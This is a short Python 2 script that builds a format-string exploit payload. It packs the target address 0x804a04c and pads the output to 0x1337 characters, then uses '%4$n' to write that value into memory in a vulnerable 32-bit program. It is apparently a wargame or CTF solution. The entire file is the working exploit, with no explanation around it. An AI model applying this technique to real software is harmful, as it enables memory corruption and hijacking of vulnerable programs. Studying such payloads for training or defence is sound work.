#!/usr/bin/python
import struct

payload = struct.pack('<I',0x804a04c)
writing = 0x1337 - 0x4
payload += "%" + str(writing) + "x"
payload += "%4$n"
print payload
